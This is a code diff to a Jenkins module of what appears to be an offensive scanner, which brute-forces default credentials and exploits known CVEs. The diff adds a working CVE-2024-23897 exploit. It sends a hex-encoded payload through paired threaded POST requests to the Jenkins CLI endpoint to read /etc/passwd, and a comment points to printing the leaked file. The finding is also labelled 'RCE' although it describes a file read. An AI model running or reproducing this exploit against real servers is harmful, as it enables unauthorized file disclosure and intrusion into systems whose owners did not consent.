@@ -4,6 +4,13 @@ from utils.output import Output
 from utils.db import DB
 from utils.utils import gen_random_string, gen_bruteforce_creds
 from lib.httpscan.http import HTTP
+import uuid
+import struct
+import urllib
+import sys
+import time
+import threading
+import http.client as originalhttp
 
 creds = [
     "admin:jenkins",
@@ -20,9 +27,10 @@ jenkins_urls = [
     'jenkins'
 ]
 
+
 class Module:
     name = 'Jenkins'
-    description = 'Discover and exploit Jenkins (bruteforce, CVE-2018-1000861)'
+    description = 'Discover and exploit Jenkins (bruteforce, CVE-2018-1000861, CVE-2024-23897)'
 
     def run(self, target, args, useragent, proxy, timeout, safe):
         http = HTTP(target['method'], target['hostname'], target['port'], useragent, proxy, timeout)
@@ -52,6 +60,48 @@ class Module:
                 'description': 'Jenkins application %s is vulnerable to RCE (CVE-2018-1000861)' % http.url(target['path']),
             }
             DB.insert_vulnerability(vuln_info)
+
+        # Checking CVE-2024-23897
+        data_bytes = b'\x00\x00\x00\x0E\x00\x00\x0C\x63\x6F\x6E\x6E\x65\x63\x74\x2D\x6E\x6F\x64\x65\x00\x00\x00\x0E\x00\x00\x0C\x40\x2F\x65\x74\x63\x2F\x70\x61\x73\x73\x77\x64\x00\x00\x00\x07\x02\x00\x05\x55\x54\x46\x2D\x38\x00\x00\x00\x07\x01\x00\x05\x66\x72\x5F\x46\x52\x00\x00\x00\x00\x03'
+        trgt = urllib.parse.urlparse(http.url(target['path']))
+        uuid_str = str(uuid.uuid4())
+
+        def req1():
+            conn = originalhttp.HTTPConnection(trgt.netloc)
+            conn.request("POST", "/cli?remoting=false", headers={
+                "Session": uuid_str,
+                "Side": "download"
+            })
+            out = conn.getresponse().read()
+            if b"root:" in out:
+                Output.vuln({'target': http.url(target['path']), 'message': '[%s] Jenkins Local File Read (CVE-2024-23897)' % self.name})
+                vuln_info = {
+                    'hostname': target['hostname'],
+                    'port': target['port'],
+                    'service': 'http',
+                    'url': http.url(target['path']),
+                    'name': 'Jenkins RCE (CVE-2024-23897)',
+                    'description': 'Jenkins application %s is vulnerable to Local File Read (CVE-2024-23897)' % http.url(target['path']),
+                }
+                DB.insert_vulnerability(vuln_info)
+                #If you want to the the output file
+                #print(out)
+
+        def req2():
+            time.sleep(0.3)
+            conn = originalhttp.HTTPConnection(trgt.netloc)
+            conn.request("POST", "/cli?remoting=false", headers={
+                "Session": uuid_str,
+                "Side": "upload",
+                "Content-type": "application/octet-stream"
+            }, body=data_bytes)
+
+        t1 = threading.Thread(target=req1)
+        t2 = threading.Thread(target=req2)
+        t1.start()
+        t2.start()
+        t1.join()
+        t2.join()
 
         for url in jenkins_urls:
             url = os.path.join(target['path'], url)
